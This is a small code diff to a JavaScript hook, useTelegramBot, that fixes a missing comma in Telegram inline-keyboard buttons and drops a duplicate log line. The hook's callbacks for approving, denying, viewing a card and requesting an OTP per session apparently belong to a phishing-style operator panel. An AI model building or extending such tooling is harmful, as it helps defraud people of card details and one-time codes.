@@ -90,7 +90,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const keyboard = {
         inline_keyboard: [
           [
-            { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` }
+            { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
             { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
           ],
           [
@@ -611,7 +611,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
               }
               else if (action === 'appr') {
                 console.log('🟢 Calling onNextStepAppr callback - NAVIGATING TO NEXTSTEPAPPR');
-                console.log('Calling onNextStepAppr callback');
+                
                 onNextStepAppr?.();
               }
               
